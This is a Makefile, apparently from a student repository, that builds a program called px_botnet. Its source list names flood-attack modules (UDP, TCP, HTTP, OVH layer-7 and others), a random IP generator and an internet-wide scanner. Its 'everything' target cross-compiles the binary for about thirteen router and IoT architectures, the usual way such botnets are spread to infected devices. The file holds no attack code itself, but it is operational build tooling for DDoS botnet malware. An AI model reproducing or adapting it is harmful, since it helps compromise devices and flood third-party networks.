# **************************************************************************** #
#                                                                              #
#                                                         :::      ::::::::    #
#    Makefile                                           :+:      :+:    :+:    #
#                                                     +:+ +:+         +:+      #
#    By: tnard <tnard@student.42lyon.fr>            +#+  +:+       +#+         #
#                                                 +#+#+#+#+#+   +#+            #
#    Created: 2022/03/24 12:35:04 by tnard             #+#    #+#              #
#    Updated: 2022/03/29 07:25:09 by tnard            ###   ########lyon.fr    #
#                                                                              #
# **************************************************************************** #

BLU					= \033[0;34m
GRN					= \033[0;32m
RED					= \033[0;31m
RST					= \033[0m
END					= \e[0m

SRCS				= px_botnet.c src/ft_strnjoin.c src/ft_free_split.c src/ft_generate_ip.c src/ft_intlen.c \
					  src/ft_get_id.c src/request/ft_request.c src/request/http.c src/protocol/global.c src/protocol/OVHL7.c \
					  src/protocol/HOLD.c src/protocol/HTTP.c src/protocol/JUNK.c src/protocol/RANDHEX.c \
					  src/protocol/STD.c src/protocol/TCP.c src/protocol/UDPRAW.c src/protocol/XTDCUSTOM.c \
					  src/protocol/UDP.c src/ft_getarch.c src/ft_scan_world.c src/protocol/PPS.c
NAME				= px_botnet
OBJS_DIR			= objs/
PROJECT_H			= includes/px_botnet.h
OBJS				= $(SRCS:.c=.o)
OBJECTS_PREFIXED	= $(addprefix $(OBJS_DIR), $(OBJS))
CC					= $(cross)gcc
AR					= $(cross)ar
CC_FLAGS			= -O3 -ffast-math -O2 -lpthread #-lssh -march=native -Ofast -Wno-format-extra-args -Wno-unused-result -Wno-format-contains-nul -flto #-Wall -Werror -Wextra

$(OBJS_DIR)%.o : %.c $(PROJECT_H)
	@mkdir -p $(OBJS_DIR)
	@mkdir -p $(OBJS_DIR)src
	@mkdir -p $(OBJS_DIR)src/request
	@mkdir -p $(OBJS_DIR)src/protocol
	@$(CC) $(CC_FLAGS) -c $< -o $@
	@printf	"\033[2K\r${BLU}[BUILD]${RST} '$<' $(END)"

$(NAME): maker $(OBJECTS_PREFIXED)
	@$(CC) -o $(NAME) $(OBJECTS_PREFIXED) $(CC_FLAGS) libft/libft.a
	@printf "\033[2K\r\033[0;32m[END]\033[0m $(NAME)$(END)\n"

all: $(NAME)

everything:
	@make fclean
	@rm -rf cross_compiled
	@mkdir cross_compiled
	@make cross=./cc/armv4l/bin/armv4l-
	@mv $(NAME) cross_compiled/$(NAME)-armv4l
	@make fclean
	@make cross=./cc/armv5l/bin/armv5l-
	@mv $(NAME) cross_compiled/$(NAME)-armv5l
	@make fclean
	@make cross=./cc/armv6l/bin/armv6l-
	@mv $(NAME) cross_compiled/$(NAME)-armv6l
	@make fclean
	@make cross=./cc/i586/bin/i586-
	@mv $(NAME) cross_compiled/$(NAME)-i586
	@make fclean
	@make cross=./cc/i686/bin/i686-
	@mv $(NAME) cross_compiled/$(NAME)-i686
	@make fclean
	@make cross=./cc/m68k/bin/m68k-
	@mv $(NAME) cross_compiled/$(NAME)-m68k
	@make fclean
	@make cross=./cc/mips/bin/mips-
	@mv $(NAME) cross_compiled/$(NAME)-mips
	@make fclean
	@make cross=./cc/mipsel/bin/mipsel-
	@mv $(NAME) cross_compiled/$(NAME)-mipsel
	@make fclean
	@make cross=./cc/powerpc/bin/powerpc-
	@mv $(NAME) cross_compiled/$(NAME)-powerpc
	@make fclean
	@make cross=./cc/powerpc-440fp/bin/powerpc-440fp-
	@mv $(NAME) cross_compiled/$(NAME)-powerpc-440fp
	@make fclean
	@make cross=./cc/sh4/bin/sh4-
	@mv $(NAME) cross_compiled/$(NAME)-sh4
	@make fclean
	@make cross=./cc/sparc/bin/sparc-
	@mv $(NAME) cross_compiled/$(NAME)-sparc
	@make fclean
	@make cross=./cc/x86_64/bin/x86_64-
	@mv $(NAME) cross_compiled/$(NAME)-x86_64
	@make fclean
	@echo All cross compiled binaries are in cross_compiled/

maker:
	@make -C libft cross=$(cross)
	
clean:
	@make clean -C libft
	@rm -rf $(OBJS_DIR)
	@printf "\033[2K\r${GRN}[CLEAN]${RST} done$(END)"

fclean: clean
	@make fclean -C libft
	@rm -f $(NAME)
	@printf "\033[2K\r${GRN}[FCLEAN]${RST} done$(END)"

re: fclean all

.PHONY:		all clean fclean re